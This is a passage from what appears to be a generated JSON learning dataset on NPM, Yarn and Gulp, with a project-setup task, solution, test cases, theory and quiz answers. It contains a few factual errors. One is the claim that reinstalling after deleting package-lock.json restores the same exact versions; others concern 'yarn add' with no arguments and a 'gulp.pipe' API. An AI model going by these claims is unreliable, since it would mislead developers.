          "description": "\nSet up and manage a small, hypothetical frontend project using NPM. You don't need to write a full React application, but demonstrate core NPM functionalities.\n\n**Requirements:**\n1.  **Initialize a project**: Create a new project directory and initialize it with `npm init` (accepting defaults where appropriate).\n2.  **Install dependencies**: Install two common frontend libraries:\n    *   `axios` (for making HTTP requests) as a regular dependency.\n    *   `webpack` and `webpack-cli` as development dependencies.\n3.  **Inspect `package.json` and `package-lock.json`**: Describe what you observe in these files after installation.\n4.  **Create a custom script**: Add a custom `start` script to `package.json` that simply echoes a message like 'Starting my amazing frontend project!' or runs a simple `echo` command.\n5.  **Run the custom script**: Execute your newly created `start` script using NPM.\n6.  **Simulate re-installation**: Delete `node_modules` and `package-lock.json` (if it was generated), then demonstrate how to re-install everything to the *exact same versions* using only `package.json` (and `package-lock.json` once it's regenerated).\n7.  **Bonus**: Try to install a non-existent package and observe the error message.\n",
          "difficulty": "easy",
          "startingCode": "/*\nNo starting code required. This task involves command-line interactions and observing file changes.\n\nFollow these steps in your terminal:\n\n1.  Create a new directory: `mkdir my-npm-project && cd my-npm-project`\n2.  Initialize the project: `npm init -y`\n3.  Open `package.json` and observe its initial content.\n4.  Install dependencies:\n    *   `npm install axios`\n    *   `npm install webpack webpack-cli --save-dev`\n5.  Observe changes in `package.json` and the creation of `package-lock.json` and `node_modules`.\n6.  Add a custom script to `package.json` under the `scripts` section:\n    ```json\n    \"scripts\": {\n      \"test\": \"echo \\\"Error: no test specified\\\" && exit 1\",\n      \"start\": \"echo \\\"Starting my amazing frontend project!\\\"\"\n    }\n    ```\n7.  Run the script: `npm run start`\n8.  Clean up for re-installation demo: `rm -rf node_modules package-lock.json` (or `rd /s /q node_modules package-lock.json` on Windows).\n9.  Re-install: `npm install`\n10. (Bonus) Try installing a non-existent package: `npm install non-existent-package-12345`\n*/\n",
          "solutionCode": "/*\nThis task is primarily command-line based. The 'solution' is the series of commands and observations.\n\n1.  **Initialize a project**\n    ```bash\n    mkdir my-npm-project\n    cd my-npm-project\n    npm init -y\n    # Output: package.json created\n    ```\n\n2.  **Install dependencies**\n    ```bash\n    npm install axios\n    npm install webpack webpack-cli --save-dev\n    # Output: Packages installed, added to package.json and package-lock.json, node_modules created.\n    ```\n\n3.  **Inspect `package.json` and `package-lock.json`**\n    *   **`package.json` observation**: `dependencies` section will now list `\"axios\": \"^X.Y.Z\"`. `devDependencies` section will list `\"webpack\": \"^X.Y.Z\"` and `\"webpack-cli\": \"^X.Y.Z\"`. Script section is still default.\n    *   **`package-lock.json` observation**: This file will be much larger. It precisely lists `axios`, `webpack`, `webpack-cli`, and all *their* transitive dependencies with exact versions, integrity hashes, and resolved URLs.\n\n4.  **Create a custom script**\n    Modify `package.json` manually:\n    ```json\n    {\n      \"name\": \"my-npm-project\",\n      \"version\": \"1.0.0\",\n      \"description\": \"\",\n      \"main\": \"index.js\",\n      \"scripts\": {\n        \"test\": \"echo \\\"Error: no test specified\\\" && exit 1\",\n        \"start\": \"echo \\\"Starting my amazing frontend project!\\\"\"\n      },\n      \"keywords\": [],\n      \"author\": \"\",\n      \"license\": \"ISC\",\n      \"dependencies\": {\n        \"axios\": \"^1.6.8\"\n      },\n      \"devDependencies\": {\n        \"webpack\": \"^5.90.3\",\n        \"webpack-cli\": \"^5.1.4\"\n      }\n    }\n    ```\n\n5.  **Run the custom script**\n    ```bash\n    npm run start\n    # Output: Starting my amazing frontend project!\n    ```\n\n6.  **Simulate re-installation**\n    ```bash\n    rm -rf node_modules package-lock.json # On Windows: rmdir /s /q node_modules && del package-lock.json\n    npm install\n    # Output: All dependencies re-installed based on package.json (and new package-lock.json regenerated).\n    # The key observation is that after this, `node_modules` is populated with the *same exact versions* as before due to package-lock.json's influence.\n    ```\n\n7.  **Bonus: Install non-existent package**\n    ```bash\n    npm install non-existent-package-12345\n    # Output: Error message indicating package not found in registry (e.g., 'npm ERR! 404 Not Found - GET .../non-existent-package-12345')\n    ```\n*/\n",
          "testCases": [
            "Directory 'my-npm-project' should be created.",
            "`package.json` should exist after `npm init -y` with basic metadata.",
            "`node_modules` directory and `package-lock.json` should be created after `npm install` commands.",
            "`package.json` should correctly list `axios` under `dependencies` and `webpack`, `webpack-cli` under `devDependencies` with semantic version ranges.",
            "`package-lock.json` should contain exact versions and integrity hashes for all installed packages (including transitive dependencies of axios and webpack).",
            "Running `npm run start` should output the custom message.",
            "After deleting `node_modules` and `package-lock.json`, running `npm install` again should successfully re-create them with the *same* exact dependency versions as before (verify by checking `package-lock.json` or module versions within `node_modules`).",
            "Attempting to install a non-existent package should result in a clear error message from NPM."
          ],
          "hints": [
            "Pay attention to the output of each NPM command.",
            "Use a text editor to view the contents of `package.json` and `package-lock.json` before and after installation steps.",
            "Remember the difference between `dependencies` and `devDependencies` and how they are typically specified during `npm install`.",
            "The `-y` flag for `npm init` bypasses interactive questions."
          ],
          "tags": [
            "NPM",
            "CLI",
            "Package Management",
            "Build Tools",
            "Project Setup",
            "Workflow"
          ],
          "timeEstimate": 30,
          "prerequisites": [
            "command_line_basics",
            "node_js_installation"
          ],
          "complexity": 5,
          "interviewRelevance": 8,
          "learningPath": "beginner",
          "relatedConcepts": [
            "semantic_versioning",
            "node_modules",
            "dependency_graph"
          ]
        }
      ]
    }
  },
  {
    "id": "d365ecc1-1663-4b97-859c-422b59bd7dbe",
    "startLine": 12700,
    "endLine": 12799,
    "processedDate": "2025-06-17T13:05:26.701Z",
    "content": {
      "logicalBlockInfo": {
        "suggestedEndLine": -1
      },
      "theory": [
        {
          "id": "theory_npm_basics",
          "title": "NPM Basics: Project Initialization, Dependency Management, and Script Execution",
          "content": "NPM (Node Package Manager) is the default package manager for Node.js. It allows developers to share and reuse code, manage project dependencies, and automate various development tasks via scripts defined in `package.json`.\n\n## Key Concepts\n\n### Project Initialization (`npm init`)\n`npm init` is used to create a new `package.json` file in your project directory. This file is a manifest for your project, containing metadata such as the project's name, version, description, entry point, test commands, and most importantly, dependencies.\n\nRunning `npm init` interactively prompts you to enter various details about your project, creating a `package.json` based on your input. You can also use `npm init -y` or `npm init --yes` to quickly generate a default `package.json` without prompts.\n\n### Installing Dependencies (`npm install`)\n`npm install <package-name>` adds a specified package to your project's `node_modules` directory and updates the `dependencies` section in your `package.json` file. These dependencies are typically required for your application to run in production.\n\n`npm install <package-name> --save-dev` (or `-D`) adds a package as a development dependency. These packages are only needed during the development process (e.g., testing frameworks, build tools, linters) and are not required for the application to run in production. They are listed under the `devDependencies` section in `package.json`.\n\nRunning `npm install` without any package name in a directory containing a `package.json` file will install all dependencies (both `dependencies` and `devDependencies`) listed in that file.\n\n### Running Scripts (`npm run`)\n`npm run <script-name>` executes custom scripts defined in the `scripts` section of your `package.json` file. This is a powerful feature for automating common tasks like starting a development server, compiling code, running tests, or building production assets.\n\nFor example, if you have a `\"start\": \"node server.js\"` script defined, running `npm run start` will execute `node server.js`. Some common scripts like `start`, `test`, `build`, `dev` can often be run without `run`, e.g., `npm start`.\n\n### `node_modules` Directory\nWhen you install packages, NPM places them in a `node_modules` directory at the root of your project. This directory typically contains all installed packages and their respective dependencies. It is usually excluded from version control (e.g., using `.gitignore`) because it can become very large, and its contents can be recreated by running `npm install` based on `package.json` and `package-lock.json`.\n\n### `package-lock.json`\nThis file is automatically generated by NPM and records the exact versions of all packages installed in `node_modules`, including nested dependencies. Its purpose is to ensure that subsequent installations (e.g., by other developers on the team or in a CI/CD pipeline) use the exact same dependency tree, preventing potential issues caused by dependency version drift.",
          "examples": [
            {
              "id": "example_npm_init",
              "title": "Initializing a Project",
              "code": "npm init -y",
              "explanation": "This command quickly initializes a new Node.js project and creates a `package.json` file with default values, skipping the interactive prompts. It's often used for quick setups or when default values are acceptable."
            },
            {
              "id": "example_npm_install_deps",
              "title": "Installing Dependencies",
              "code": "npm install express\nnpm install webpack --save-dev",
              "explanation": "The first command installs 'express' as a regular dependency (required for runtime). The second command installs 'webpack' as a development dependency (only needed for building, not runtime). Both will be added to `package.json` and `node_modules`."
            },
            {
              "id": "example_npm_run_script",
              "title": "Running a Custom Script",
              "code": "// package.json\n{\n  \"name\": \"my-app\",\n  \"version\": \"1.0.0\",\n  \"scripts\": {\n    \"start\": \"node app.js\",\n    \"build\": \"webpack --config webpack.prod.js\"\n  }\n}\n\n// Command to run:\nnpm run start\nnpm run build",
              "explanation": "This demonstrates how to define and execute custom scripts. `npm run start` will execute `node app.js` and `npm run build` will execute `webpack --config webpack.prod.js`. This centralizes common commands."
            }
          ],
          "relatedQuestions": [
            "question_npm_yarn_compare",
            "question_npm_dev_dependency",
            "question_package_json_purpose",
            "question_npm_init_purpose",
            "question_npm_run_script_purpose",
            "question_node_modules_purpose"
          ],
          "relatedTasks": [
            "task_npm_yarn_project_setup"
          ],
          "tags": [
            "NPM",
            "Package Manager",
            "Node.js",
            "Dependencies",
            "DevOps",
            "Frontend Build Tools"
          ],
          "technology": "Node.js, NPM",
          "prerequisites": [
            "Basic understanding of command line",
            "Node.js environment setup"
          ],
          "complexity": 4,
          "interviewRelevance": 8,
          "learningPath": "beginner",
          "requiredFor": [
            "Any Node.js/Frontend project",
            "Understanding project structure"
          ]
        },
        {
          "id": "theory_yarn_basics",
          "title": "Yarn Basics: An Alternative Package Manager",
          "content": "Yarn is an alternative package manager for Node.js, developed by Facebook (now Meta) in collaboration with Google, Exponent, and Tilde. It was created to address some limitations and concerns of NPM, particularly regarding performance, security, and reproducibility of builds, which were more prominent in NPM's earlier versions.\n\nWhile NPM has significantly improved since Yarn's inception, Yarn still offers compelling features and a slightly different command syntax.\n\n## Key Concepts\n\n### Yarn's Advantages (Historically)\n*   **Performance:** Yarn introduced parallel installations and caching mechanisms that often resulted in faster dependency installations compared to older NPM versions.\n*   **Security:** It uses checksums to verify the integrity of packages before installation, providing a layer of security.\n*   **Reproducibility:** Yarn introduced the `yarn.lock` file (similar to NPM's `package-lock.json`) to ensure that every installation results in the exact same `node_modules` tree across different environments, preventing 'it works on my machine' issues.\n\n### Project Initialization (`yarn init`)\nSimilar to `npm init`, `yarn init` creates a `package.json` file. It also offers interactive prompts or a quick default generation.\n\n### Installing Dependencies (`yarn add`)\n`yarn add <package-name>` installs a package as a regular dependency and adds it to the `dependencies` section of `package.json`. It also updates `yarn.lock`.\n\n`yarn add <package-name> --dev` (or `-D`) installs a package as a development dependency, adding it to the `devDependencies` section. `yarn add` without any package name installs all dependencies listed in `package.json`.\n\n### Running Scripts (`yarn <script-name>`)\nTo run scripts defined in `package.json`, Yarn simplifies the command. Instead of `npm run <script-name>`, you typically use `yarn <script-name>`. For standard scripts like `start`, `test`, `build`, you can just use `yarn start`, `yarn test`, etc.\n\n### `yarn.lock` File\nThis file is Yarn's equivalent of `package-lock.json`. It records the exact versions of all installed packages, ensuring consistent installations across different environments.",
          "examples": [
            {
              "id": "example_yarn_init",
              "title": "Initializing a Project with Yarn",
              "code": "yarn init -y",
              "explanation": "This command quickly initializes a new project with Yarn, generating a `package.json` file with default values. It's parallel to `npm init -y`."
            },
            {
              "id": "example_yarn_add_deps",
              "title": "Installing Dependencies with Yarn",
              "code": "yarn add react\nyarn add typescript --dev",
              "explanation": "The first command installs 'react' as a regular dependency. The second command installs 'typescript' as a development dependency. Both commands update `package.json` and `yarn.lock`."
            },
            {
              "id": "example_yarn_run_script",
              "title": "Running a Custom Script with Yarn",
              "code": "// package.json\n{\n  \"name\": \"my-yarn-app\",\n  \"version\": \"1.0.0\",\n  \"scripts\": {\n    \"serve\": \"live-server ./dist\",\n    \"lint\": \"eslint .\"\n  }\n}\n\n// Command to run:\nyarn serve\nyarn lint",
              "explanation": "This demonstrates running custom scripts with Yarn. `yarn serve` executes `live-server ./dist` and `yarn lint` executes `eslint .`. Notice the absence of `run` keyword for running scripts compared to `npm run`."
            }
          ],
          "relatedQuestions": [
            "question_npm_yarn_compare",
            "question_yarn_security_feature",
            "question_yarn_vs_npm_speed",
            "question_yarn_lock_purpose"
          ],
          "relatedTasks": [
            "task_npm_yarn_project_setup"
          ],
          "tags": [
            "Yarn",
            "Package Manager",
            "Node.js",
            "Dependencies",
            "Frontend Build Tools"
          ],
          "technology": "Node.js, Yarn",
          "prerequisites": [
            "Basic understanding of command line",
            "Node.js environment setup"
          ],
          "complexity": 4,
          "interviewRelevance": 7,
          "learningPath": "beginner",
          "requiredFor": [
            "Any Node.js/Frontend project",
            "Understanding project alternatives"
          ]
        },
        {
          "id": "theory_gulp_task_runner",
          "title": "Gulp: Automating Frontend Workflow with Task Runner",
          "content": "Gulp is a JavaScript-based task runner that helps automate time-consuming and repetitive tasks in your development workflow. Unlike some other build tools that rely on declarative configuration files, Gulp uses a 'code-over-configuration' approach, where you write JavaScript code to define your build tasks. This makes it highly flexible and extensible.\n\n## Key Concepts\n\n### What Gulp Automates\nGulp is commonly used for tasks such as:\n*   **Compiling Preprocessors:** Converting Sass/Less to CSS, TypeScript/Babel to JavaScript.\n*   **Minification & Concatenation:** Reducing file sizes and combining multiple files for production.\n*   **Linting:** Checking code for errors and stylistic issues.\n*   **Optimizing Assets:** Compressing images, optimizing fonts.\n*   **Live Reloading:** Automatically refreshing the browser on code changes.\n*   **Running Tests:** Automating test execution.\n\n### Code-over-Configuration\nWith Gulp, you define your tasks programmatically in a `gulpfile.js` file. This means you use JavaScript to specify what files to process, what operations to perform on them, and where to output the results. This offers more power and flexibility compared to XML or JSON-based configuration.\n\n### Streams\nGulp leverages Node.js streams. Instead of reading a file from disk, performing an operation, writing it back to disk, then reading it again for the next operation, Gulp passes files through a series of 'pipes' in memory. This 'streaming' approach is highly efficient as it avoids excessive disk I/O, speeding up build processes. Each `pipe()` function typically takes a Gulp plugin that performs a specific transformation on the streamed files.\n\n### Core Gulp API Methods\n*   `gulp.task(name, fn)`: Defines a new task. (Older syntax, `gulp.series` and `gulp.parallel` are preferred for chaining).\n*   `gulp.src(globs)`: Specifies the input files for a task using glob patterns (e.g., `**/*.scss` for all SCSS files in any subdirectory).\n*   `gulp.pipe(plugin())`: Pipes the files through a Gulp plugin, which transforms them.\n*   `gulp.dest(path)`: Specifies the output directory for processed files.\n*   `gulp.watch(globs, tasks)`: Watches files for changes and runs specified tasks when changes are detected.\n*   `gulp.series(...tasks)`: Runs tasks sequentially.\n*   `gulp.parallel(...tasks)`: Runs tasks concurrently.\n\n### `gulpfile.js` Example Breakdown\nThe provided `gulpfile.js` demonstrates:\n1.  **Dependencies:** `gulp`, `gulp-sass`, `gulp-autoprefixer` are required.\n2.  **`sass` Task:**\n    *   `gulp.src('./src/scss/**/*.scss')`: Selects all SCSS files within the `src/scss` directory and its subdirectories.\n    *   `.pipe(sass())`: Compiles SCSS to CSS using `gulp-sass`.\n    *   `.pipe(autoprefixer())`: Adds vendor prefixes to CSS properties using `gulp-autoprefixer`.\n    *   `.pipe(gulp.dest('./dist/css'))`: Saves the resulting CSS files to the `dist/css` directory.\n3.  **`watch` Task:**\n    *   `gulp.watch('./src/scss/**/*.scss', gulp.series('sass'))`: Monitors SCSS files. If any changes are detected, it runs the `sass` task sequentially.\n4.  **`default` Task:**\n    *   `gulp.task('default', gulp.series('sass', 'watch'))`: Defines a default task that runs the `sass` task once, and then starts the `watch` task. This is the task that executes when you simply run `gulp` in the terminal.",
          "examples": [
            {
              "id": "example_gulp_basic_setup",
              "title": "Basic Gulpfile Structure",
              "code": "const gulp = require('gulp');\n\nfunction clean(cb) {\n  // Task to clean build directory\n  console.log('Cleaning build directory...');\n  cb(); // Callback to signal task completion\n}\n\nfunction copyHtml() {\n  return gulp.src('./src/**/*.html')\n    .pipe(gulp.dest('./dist'));\n}\n\nexports.clean = clean;\nexports.copyHtml = copyHtml;\nexports.build = gulp.series(clean, copyHtml);\nexports.default = exports.build;\n",
              "explanation": "This example shows a modern Gulp 4 setup using `exports` for tasks. `clean` is a simple task that uses a callback to signal completion. `copyHtml` copies HTML files from `src` to `dist`. `exports.build` defines a series of tasks (`clean` then `copyHtml`), and `exports.default` makes `build` the default task, run by typing `gulp`."
            },
            {
              "id": "example_gulp_scss_pipeline",
              "title": "SCSS Compilation and Autoprefixing",
              "code": "// gulpfile.js\nconst gulp = require('gulp');\nconst sass = require('gulp-sass')(require('sass')); // Node-sass or dart-sass required\nconst autoprefixer = require('gulp-autoprefixer');\n\nfunction compileSass() {\n  return gulp.src('./src/scss/**/*.scss')\n    .pipe(sass().on('error', sass.logError))\n    .pipe(autoprefixer({\n      overrideBrowserslist: ['last 2 versions'],\n      cascade: false\n    }))\n    .pipe(gulp.dest('./dist/css'));\n}\n\nexports.sass = compileSass;\nexports.watch = function() {\n  gulp.watch('./src/scss/**/*.scss', compileSass);\n};\nexports.default = gulp.series(compileSass, exports.watch);\n",
              "explanation": "This is an enhanced version of the provided Gulpfile example. It explicitly uses `require('sass')` with `gulp-sass` (which prefers Dart Sass). It also adds error logging for Sass and configures `autoprefixer` with `overrideBrowserslist` for better browser compatibility control. This pipeline efficiently compiles, prefixes, and outputs CSS."
            }
          ],
          "relatedQuestions": [
            "question_gulp_purpose",
            "question_gulp_streams",
            "question_gulp_code_over_config",
            "question_gulp_src_dest",
            "question_gulp_watch_explain",
            "question_task_runner_definition"
          ],
          "relatedTasks": [
            "task_extend_gulp_build"
          ],
          "tags": [
            "Gulp",
            "Task Runner",
            "Automation",
            "Frontend Build Tools",
            "Webpack Alternative",
            "Streams",
            "SCSS",
            "CSS"
          ],
          "technology": "Node.js, Gulp",
          "prerequisites": [
            "Basic JavaScript",
            "Node.js environment setup",
            "Command line basics"
          ],
          "complexity": 6,
          "interviewRelevance": 7,
          "learningPath": "intermediate",
          "requiredFor": [
            "Advanced Frontend Development",
            "Build Process Optimization"
          ]
        }
      ],
      "questions": [
        {
          "id": "question_npm_yarn_compare",
          "topic": "NPM vs. Yarn",
          "level": "medium",
          "type": "open",
          "question": "Compare and contrast NPM and Yarn as package managers. Discuss their historical context, key features, and primary differences in command usage and underlying philosophy. What are the advantages of one over the other in different scenarios?",
          "answer": "N/A",
          "analysisPoints": [
            "Historical context: Yarn's origin addressing NPM's earlier issues (speed, security, reproducibility).",
            "Performance: Discuss parallel installations, caching (Yarn's initial advantage, NPM's improvements).",
            "Security: Yarn's checksums, NPM's audit features.",
            "Reproducibility: `package-lock.json` vs `yarn.lock`.",
            "Command syntax differences: `npm install` vs `yarn add`, `npm run` vs `yarn`.",
            "Philosophy: NPM being Node.js default, Yarn as an open-source alternative backed by Facebook.",
            "Current state: Both are highly capable; choice often depends on team preference or existing project setup."
          ],
          "keyConcepts": [
            "NPM",
            "Yarn",
            "Package Manager",
            "Dependencies",
            "package.json",
            "package-lock.json",
            "yarn.lock"
          ],
          "evaluationCriteria": [
            "Depth of historical understanding.",
            "Accuracy of technical comparison (performance, security, reproducibility).",
            "Correctness of command syntax differences.",
            "Ability to articulate nuanced advantages/disadvantages.",
            "Structured and clear explanation."
          ],
          "example": "A good answer would cover how Yarn emerged due to NPM's early performance and security gaps, introducing features like parallel installs and checksum verification. It would contrast `npm install <pkg>` with `yarn add <pkg>` and `npm run <script>` with `yarn <script>`. While NPM has caught up significantly, Yarn might still be preferred for its strictness in `yarn.lock` for reproducibility or its CLI aesthetics for some developers.",
          "tags": [
            "NPM",
            "Yarn",
            "Package Manager",
            "Comparison"
          ],
          "prerequisites": [
            "theory_npm_basics",
            "theory_yarn_basics"
          ],
          "complexity": 7,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_npm_dev_dependency",
          "topic": "NPM Dependencies",
          "level": "easy",
          "type": "mcq",
          "question": "Which command installs `eslint` as a development dependency for a project?",
          "answer": "npm install eslint --save-dev",
          "options": [
            "npm install eslint",
            "npm add eslint --dev",
            "npm install eslint --save-dev",
            "npm build eslint"
          ],
          "analysisPoints": [
            "Understanding the distinction between regular and development dependencies.",
            "Knowing the correct flag for development dependencies in NPM.",
            "Familiarity with common NPM commands."
          ],
          "keyConcepts": [
            "NPM",
            "Dependencies",
            "devDependencies",
            "package.json"
          ],
          "evaluationCriteria": [
            "Correct identification of the `save-dev` flag.",
            "Understanding `npm install` command.",
            "Distinguishing between `dependencies` and `devDependencies`."
          ],
          "example": "The `--save-dev` (or `-D`) flag is crucial for designating a package as a development dependency, meaning it's only needed during development time (e.g., for linting, testing, or building) and not for the application's runtime in production. `npm install eslint` would add it as a regular dependency, which is usually not desired for linters.",
          "tags": [
            "NPM",
            "Dependencies",
            "CLI"
          ],
          "prerequisites": [
            "theory_npm_basics"
          ],
          "complexity": 3,
          "interviewFrequency": 9,
          "learningPath": "beginner"
        },
        {
          "id": "question_package_json_purpose",
          "topic": "package.json",
          "level": "easy",
          "type": "flashcard",
          "question": "What is the primary purpose of the `package.json` file in a Node.js/frontend project?",
          "answer": "The `package.json` file serves as a manifest for a Node.js project. It contains metadata about the project (name, version, author), defines scripts for automation, and lists all project dependencies and development dependencies.",
          "analysisPoints": [
            "Metadata storage.",
            "Script definitions.",
            "Dependency management."
          ],
          "keyConcepts": [
            "package.json",
            "NPM",
            "Yarn",
            "Dependencies",
            "Scripts"
          ],
          "evaluationCriteria": [
            "Ability to articulate the core functions of `package.json`."
          ],
          "example": "The `package.json` is like the ID card of your project, specifying essential information and allowing package managers to understand how to set up the project's environment and run its commands.",
          "tags": [
            "NPM",
            "Yarn",
            "package.json",
            "Flashcard"
          ],
          "prerequisites": [
            "theory_npm_basics",
            "theory_yarn_basics"
          ],
          "complexity": 2,
          "interviewFrequency": 9,
          "learningPath": "beginner"
        },
        {
          "id": "question_gulp_purpose",
          "topic": "Gulp Task Runner",
          "level": "medium",
          "type": "mcq",
          "question": "Which of the following best describes the primary purpose of Gulp in a frontend development workflow?",
          "answer": "To automate repetitive tasks like compiling Sass, minifying JavaScript, and optimizing images.",
          "options": [
            "To manage and install Node.js packages and their dependencies.",
            "To provide a framework for building single-page applications.",
            "To automate repetitive tasks like compiling Sass, minifying JavaScript, and optimizing images.",
            "To provide a server-side runtime environment for JavaScript."
          ],
          "analysisPoints": [
            "Distinguishing task runners from package managers, frameworks, and runtime environments.",
            "Identifying common tasks automated by Gulp.",
            "Understanding the core value proposition of build tools."
          ],
          "keyConcepts": [
            "Gulp",
            "Task Runner",
            "Automation",
            "Frontend Build Tools"
          ],
          "evaluationCriteria": [
            "Correctly identifying Gulp's role.",
            "Understanding what Gulp automates."
          ],
          "example": "Gulp is not a package manager like NPM/Yarn (option A), nor a SPA framework (option B like React/Vue), nor a runtime (option D like Node.js). Its core function is automating repetitive tasks, which is crucial for efficient frontend development.",
          "tags": [
            "Gulp",
            "Task Runner",
            "Automation",
            "MCQ"
          ],
          "prerequisites": [
            "theory_gulp_task_runner"
          ],
          "complexity": 5,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_gulp_streams",
          "topic": "Gulp Streams",
          "level": "hard",
          "type": "open",
          "question": "Gulp leverages 'streams' for efficiency. Explain what streams are in the context of Gulp, how they contribute to performance, and illustrate with an example pipeline.",
          "answer": "N/A",
          "analysisPoints": [
            "Definition of streams (data flowing through pipes).",
            "How Gulp uses streams (in-memory processing vs. disk I/O).",
            "Performance benefits (reduced disk operations, faster builds).",
            "Explanation of a `gulp.src().pipe().pipe().dest()` pipeline.",
            "Analogy to physical pipes or assembly lines."
          ],
          "keyConcepts": [
            "Gulp",
            "Streams",
            "Performance Optimization",
            "Build Tools",
            "Node.js"
          ],
          "evaluationCriteria": [
            "Clarity and accuracy of stream definition.",
            "Ability to connect streams to Gulp's performance.",
            "Effectiveness of the example pipeline.",
            "Depth of understanding of file processing in build systems."
          ],
          "example": "In Gulp, streams allow data (files) to be passed from one operation (plugin) to the next in memory, rather than writing to disk after each step. For instance, `gulp.src('*.js').pipe(uglify()).pipe(rename('*.min.js')).pipe(gulp.dest('dist'))` will read JS files, minify them, rename them, and then save them to disk, all as a continuous flow. This minimizes slow disk I/O, significantly speeding up build times.",
          "tags": [
            "Gulp",
            "Streams",
            "Performance",
            "Advanced"
          ],
          "prerequisites": [
            "theory_gulp_task_runner"
          ],
          "complexity": 8,
          "interviewFrequency": 6,
          "learningPath": "advanced"
        },
        {
          "id": "question_yarn_security_feature",
          "topic": "Yarn Features",
          "level": "medium",
          "type": "flashcard",
          "question": "What security feature did Yarn introduce (compared to older NPM versions) to verify package integrity?",
          "answer": "Yarn introduced the use of checksums to verify the integrity of packages before installation, ensuring that downloaded packages haven't been tampered with.",
          "analysisPoints": [
            "Checksums.",
            "Package integrity.",
            "Prevention of tampering."
          ],
          "keyConcepts": [
            "Yarn",
            "Security",
            "Checksums",
            "Package Manager"
          ],
          "evaluationCriteria": [
            "Correctly identifying the security mechanism."
          ],
          "example": "This feature helps mitigate risks associated with malicious package injection by ensuring the downloaded package matches its expected cryptographic hash.",
          "tags": [
            "Yarn",
            "Security",
            "Flashcard"
          ],
          "prerequisites": [
            "theory_yarn_basics"
          ],
          "complexity": 4,
          "interviewFrequency": 6,
          "learningPath": "intermediate"
        },
        {
          "id": "question_npm_init_purpose",
          "topic": "NPM Initialization",
          "level": "easy",
          "type": "flashcard",
          "question": "What is the primary function of the `npm init` command?",
          "answer": "The `npm init` command is used to initialize a new Node.js project by creating a `package.json` file in the current directory, which stores project metadata and configuration.",
          "analysisPoints": [
            "Project initialization.",
            "Creation of `package.json`.",
            "Metadata storage."
          ],
          "keyConcepts": [
            "NPM",
            "npm init",
            "package.json",
            "Project Setup"
          ],
          "evaluationCriteria": [
            "Accurate description of `npm init`'s role."
          ],
          "example": "It's the first step to set up any Node.js or frontend project that uses NPM for dependency management.",
          "tags": [
            "NPM",
            "CLI",
            "Flashcard"
          ],
          "prerequisites": [
            "theory_npm_basics"
          ],
          "complexity": 2,
          "interviewFrequency": 8,
          "learningPath": "beginner"
        },
        {
          "id": "question_npm_run_script_purpose",
          "topic": "NPM Scripts",
          "level": "easy",
          "type": "flashcard",
          "question": "How do you execute a custom script named `dev` defined in `package.json` using NPM?",
          "answer": "You execute it using `npm run dev`.",
          "analysisPoints": [
            "Correct command syntax for running scripts."
          ],
          "keyConcepts": [
            "NPM",
            "Scripts",
            "package.json",
            "CLI"
          ],
          "evaluationCriteria": [
            "Correct command usage."
          ],
          "example": "If `package.json` has `\"scripts\": { \"dev\": \"webpack serve\" }`, then `npm run dev` will start the webpack development server.",
          "tags": [
            "NPM",
            "Scripts",
            "Flashcard"
          ],
          "prerequisites": [
            "theory_npm_basics"
          ],
          "complexity": 2,
          "interviewFrequency": 8,
          "learningPath": "beginner"
        },
        {
          "id": "question_node_modules_purpose",
          "topic": "`node_modules` and `package-lock.json`",
          "level": "medium",
          "type": "open",
          "question": "Explain the purpose of the `node_modules` directory and the `package-lock.json` file in a Node.js project. Why is `node_modules` typically excluded from version control while `package-lock.json` is included?",
          "answer": "N/A",
          "analysisPoints": [
            "`node_modules` stores actual installed package code.",
            "`package-lock.json` records exact dependency tree for reproducibility.",
            "Reasons for excluding `node_modules` (large size, easily reproducible).",
            "Reasons for including `package-lock.json` (consistent builds, preventing dependency drift).",
            "Role of `npm install` in recreating `node_modules` from `package-lock.json`."
          ],
          "keyConcepts": [
            "node_modules",
            "package-lock.json",
            "NPM",
            "Yarn",
            "Dependencies",
            "Version Control",
            "Reproducibility"
          ],
          "evaluationCriteria": [
            "Clear distinction between `node_modules` and `package-lock.json`.",
            "Accurate reasons for Gitignore practices.",
            "Understanding of dependency resolution and consistent builds."
          ],
          "example": "`node_modules` is where all your project's dependencies actually reside, making it very large. `package-lock.json` (or `yarn.lock`) ensures that when someone else installs dependencies, they get the exact same versions as you, guaranteeing a consistent build environment across all developers and CI/CD pipelines. Since `node_modules` can be recreated from `package-lock.json`, it's not committed to Git.",
          "tags": [
            "NPM",
            "package-lock.json",
            "node_modules",
            "Version Control"
          ],
          "prerequisites": [
            "theory_npm_basics"
          ],
          "complexity": 6,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_gulp_code_over_config",
          "topic": "Gulp Philosophy",
          "level": "medium",
          "type": "flashcard",
          "question": "What does 'code-over-configuration' mean in the context of Gulp?",
          "answer": "In Gulp, 'code-over-configuration' means that build tasks are defined by writing JavaScript code in `gulpfile.js`, rather than relying on declarative configuration files (like XML or JSON). This approach offers greater flexibility and programmatic control over the build process.",
          "analysisPoints": [
            "Tasks defined as JavaScript functions.",
            "Flexibility and programmatic control.",
            "Contrast with declarative configuration."
          ],
          "keyConcepts": [
            "Gulp",
            "Code-over-configuration",
            "Build Tools",
            "Flexibility"
          ],
          "evaluationCriteria": [
            "Accurate definition of the term.",
            "Understanding its implication for Gulp development."
          ],
          "example": "Instead of filling out an XML file with `<task name='sass-compile'>...</task>`, you write `function compileSass() { /* ... */ }` in JavaScript, giving you the full power of the language for complex logic.",
          "tags": [
            "Gulp",
            "Philosophy",
            "Flashcard"
          ],
          "prerequisites": [
            "theory_gulp_task_runner"
          ],
          "complexity": 5,
          "interviewFrequency": 5,
          "learningPath": "intermediate"
        },
        {
          "id": "question_gulp_src_dest",
          "topic": "Gulp API",
          "level": "easy",
          "type": "flashcard",
          "question": "Explain the roles of `gulp.src()` and `gulp.dest()` in a Gulp task pipeline.",
          "answer": "`gulp.src()` defines the source files that a task will process (input), using glob patterns. `gulp.dest()` specifies the destination directory where the processed files will be saved (output).",
          "analysisPoints": [
            "Input vs. Output.",
            "File selection using `gulp.src()`.",
            "Output directory for `gulp.dest()`."
          ],
          "keyConcepts": [
            "Gulp",
            "API",
            "Filesystem Operations",
            "Build Pipeline"
          ],
          "evaluationCriteria": [
            "Clear distinction between source and destination."
          ],
          "example": "Think of `src` as 'where do I get the files from?' and `dest` as 'where do I put the finished files?'.",
          "tags": [
            "Gulp",
            "API",
            "Flashcard"
          ],
          "prerequisites": [
            "theory_gulp_task_runner"
          ],
